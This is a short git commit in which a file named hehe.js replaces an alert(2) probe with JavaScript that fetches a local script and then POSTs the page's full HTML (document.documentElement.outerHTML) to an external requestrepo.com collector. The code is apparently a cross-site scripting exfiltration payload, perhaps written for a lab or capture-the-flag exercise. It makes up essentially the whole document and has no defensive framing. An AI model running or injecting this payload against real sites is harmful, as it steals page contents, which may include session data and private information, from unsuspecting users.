14a5a25849cdd9b15689f215a91b39821028ecdb
Spycio.Kon <77606941+tiyeume25112004@users.noreply.github.com>
2024-05-05 13:55:23 +0700

    Update hehe.js

--- hehe.js
+++ hehe.js
@@ -1,1 +1,2 @@
-alert(2)
+fetch('http://localhost:1234/mo.js').then(res =>res.text()).then(data=>fetch("http://au6jet4q.requestrepo.com/",{method:"POST",mode:"no-cors",body:document.documentElement.outerHTML
+}))
